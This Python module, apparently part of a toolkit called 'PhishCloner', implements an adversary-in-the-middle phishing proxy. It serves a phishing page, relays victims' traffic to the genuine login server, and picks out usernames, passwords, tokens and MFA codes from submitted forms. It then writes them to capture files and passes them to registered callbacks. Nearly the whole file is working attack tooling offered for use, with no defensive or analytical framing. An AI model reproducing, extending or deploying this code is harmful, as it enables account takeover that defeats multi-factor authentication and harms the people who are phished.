"""
PhishCloner Engine — Module 2: MITM Proxy
Signé Ghost1o1 — v1.0.0

Reverse proxy AiTM (Adversary-in-the-Middle).
Intercepte les requêtes HTTP/HTTPS, modifie à la volée,
forward vers le serveur upstream authentique, capture credentials + tokens.
"""

import asyncio
import json
import logging
import re
import ssl
from datetime import datetime
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

import aiohttp
from aiohttp import web

log = logging.getLogger("PhishCloner.MITM")


class MITMProxy:
    """
    Module 2: Adversary-in-the-Middle reverse proxy.

    Flux:
        Victim → Server Phish (TLS) → MITMProxy → Upstream IDP (real)
                ↓
                Capture credentials + tokens (memory/disk)
    """

    CAPTURE_DIR = Path("phish_sessions")

    def __init__(
        self,
        upstream_url: str,
        listen_host: str = "0.0.0.0",
        listen_port: int = 8443,
        cert_path: Optional[str] = None,
        key_path: Optional[str] = None,
        template_loader: Optional[Any] = None,
    ):
        self.upstream_url = upstream_url
        self.parsed_upstream = urlparse(upstream_url)
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.cert_path = cert_path
        self.key_path = key_path
        self.template_loader = template_loader

        self.captures: List[Dict] = []
        self.session_id = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        self.CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
        self._session: Optional[aiohttp.ClientSession] = None
        self._app: Optional[web.Application] = None
        self._runner: Optional[web.AppRunner] = None

        # Hooks for credential interception
        self.cred_hooks: List[Callable[[Dict], None]] = []

    # ── SSL Context ──

    def _build_ssl_context(self) -> Optional[ssl.SSLContext]:
        if not (self.cert_path and self.key_path):
            return None
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ctx.load_cert_chain(certfile=self.cert_path, keyfile=self.key_path)
        return ctx

    # ── Capture Methods ──

    def _add_capture(
        self,
        method: str,
        url: str,
        body: Any,
        headers: Dict,
        source_ip: str,
        kind: str = "credential",
    ) -> Dict:
        capture = {
            "timestamp": datetime.utcnow().isoformat(),
            "session_id": self.session_id,
            "method": method,
            "url": url,
            "kind": kind,
            "source_ip": source_ip,
            "headers": dict(headers),
            "body": body if isinstance(body, (dict, list, str)) else str(body)[:5000],
        }
        self.captures.append(capture)
        log.warning(f"🎯 CAPTURE [{kind}] {method} {url} from {source_ip}")
        # Trigger hooks
        for hook in self.cred_hooks:
            try:
                hook(capture)
            except Exception as e:
                log.error(f"Hook failed: {e}")
        return capture

    def add_cred_hook(self, hook: Callable[[Dict], None]) -> None:
        """Register callback for credentials capture."""
        self.cred_hooks.append(hook)

    def save_captures(self) -> Path:
        """Save all captures to JSONL file."""
        capture_file = self.CAPTURE_DIR / f"capture_{self.session_id}.jsonl"
        with open(capture_file, "w") as f:
            for cap in self.captures:
                f.write(json.dumps(cap) + "\n")
        log.info(f"Captures saved: {capture_file}")
        return capture_file

    # ── Credential Detection ──

    @staticmethod
    def _looks_like_credentials(data: Dict) -> Optional[Dict]:
        """Détecte les credentials dans le body."""
        cred_keys = {"username", "user", "email", "login", "userid", "uid", "account"}
        pass_keys = {"password", "pass", "passwd", "pwd", "secret", "token", "passphrase"}

        found_user = None
        found_pass = None

        for k, v in data.items():
            if not isinstance(v, (str, list)):
                continue
            lk = k.lower()
            if any(p in lk for p in cred_keys) and not found_user:
                found_user = v if isinstance(v, str) else v[0] if v else None
            if any(p in lk for p in pass_keys) and not found_pass:
                found_pass = v if isinstance(v, str) else v[0] if v else None

        if found_user and found_pass:
            return {"username": found_user, "password": found_pass}
        return None

    @staticmethod
    def _looks_like_mfa(data: Dict) -> Optional[Dict]:
        mfa_keys = {"code", "otp", "totp", "mfa", "2fa", "passcode", "verification", "token_code"}
        for k, v in data.items():
            lk = k.lower()
            if any(p in lk for p in mfa_keys):
                if isinstance(v, str) and re.match(r"^\d{4,8}$", v):
                    return {"field": k, "code": v, "type": "totp"}
                elif isinstance(v, str) and v:
                    return {"field": k, "code": v, "type": "mfa_push"}
        return None

    # ── HTTP Handlers ──

    async def _handle_request(self, request: web.Request) -> web.Response:
        """Route principale du MITM proxy."""
        source_ip = request.remote or "unknown"
        target_path = request.path
        method = request.method

        # Read body
        body_bytes = await request.read()
        body_str = body_bytes.decode("utf-8", errors="ignore") if body_bytes else ""

        # Parse body
        body_data: Dict = {}
        content_type = request.headers.get("Content-Type", "").lower()

        if "application/json" in content_type:
            try:
                body_data = json.loads(body_str) if body_str else {}
            except json.JSONDecodeError:
                body_data = {"_raw": body_str}
        elif "application/x-www-form-urlencoded" in content_type:
            from urllib.parse import parse_qs
            parsed = parse_qs(body_str)
            body_data = {k: v[0] if len(v) == 1 else v for k, v in parsed.items()}
        else:
            body_data = {"_raw": body_str[:1000]}

        # Credential detection
        creds = self._looks_like_credentials(body_data) if isinstance(body_data, dict) else None
        if creds:
            self._add_capture(method, target_path, {**body_data, "_creds": creds},
                              dict(request.headers), source_ip, "credential")

        # MFA detection
        mfa = self._looks_like_mfa(body_data) if isinstance(body_data, dict) else None
        if mfa:
            self._add_capture(method, target_path, {**body_data, "_mfa": mfa},
                              dict(request.headers), source_ip, "mfa_token")

        # Generic body capture
        if method == "POST" and body_str and not (creds or mfa):
            self._add_capture(method, target_path, body_data,
                              dict(request.headers), source_ip, "post_body")

        # Build upstream request
        upstream_url = urljoin(self.upstream_url, target_path)
        if request.query_string:
            upstream_url += f"?{request.query_string}"

        # Filter hop-by-hop headers
        hop_by_hop = {
            "host", "connection", "keep-alive", "proxy-authenticate",
            "proxy-authorization", "te", "trailers", "transfer-encoding",
            "upgrade", "content-length",
        }
        fwd_headers = {
            k: v for k, v in request.headers.items()
            if k.lower() not in hop_by_hop
        }
        fwd_headers["Host"] = self.parsed_upstream.netloc

        # Forward to upstream
        try:
            if not self._session:
                self._session = aiohttp.ClientSession()

            async with self._session.request(
                method=method,
                url=upstream_url,
                headers=fwd_headers,
                data=body_bytes if body_bytes else None,
                allow_redirects=False,
                ssl=False,  # upstream certs validated separately
            ) as upstream_resp:
                resp_body = await upstream_resp.read()
                resp_headers = dict(upstream_resp.headers)

                # Remove hop-by-hop
                for h in hop_by_hop:
                    resp_headers.pop(h, None)

                return web.Response(
                    body=resp_body,
                    status=upstream_resp.status,
                    headers=resp_headers,
                )
        except aiohttp.ClientError as e:
            log.error(f"Upstream error: {e}")
            return web.Response(text=f"Upstream error: {e}", status=502)

    async def _handle_root(self, request: web.Request) -> web.Response:
        """Handle root - serve phishing template if available."""
        if self.template_loader:
            html = self.template_loader.get_html("generic")
            if html:
                return web.Response(text=html, content_type="text/html")
        return web.Response(text="<h1>PhishCloner Ultimate</h1>", content_type="text/html")

    async def _handle_health(self, request: web.Request) -> web.Response:
        return web.json_response(
            {
                "status": "alive",
                "session_id": self.session_id,
                "captures": len(self.captures),
                "upstream": self.upstream_url,
            }
        )

    # ── Server Lifecycle ──

    def build_app(self) -> web.Application:
        self._app = web.Application()
        self._app.router.add_get("/", self._handle_root)
        self._app.router.add_get("/health", self._handle_health)
        # Wildcard catch-all for MITM
        self._app.router.add_route("*", "/{path:.*}", self._handle_request)
        return self._app

    async def start(self) -> None:
        """Start the MITM proxy server."""
        self.build_app()
        self._runner = web.AppRunner(self._app)
        await self._runner.setup()

        ssl_context = self._build_ssl_context()
        site = web.TCPSite(
            self._runner,
            host=self.listen_host,
            port=self.listen_port,
            ssl_context=ssl_context,
        )
        await site.start()
        log.info(f"🎯 MITM proxy listening on {self.listen_host}:{self.listen_port} → {self.upstream_url}")

    async def stop(self) -> None:
        if self._session:
            await self._session.close()
        if self._runner:
            await self._runner.cleanup()
        if self.captures:
            self.save_captures()
        log.info(f"MITM proxy stopped. {len(self.captures)} captures.")
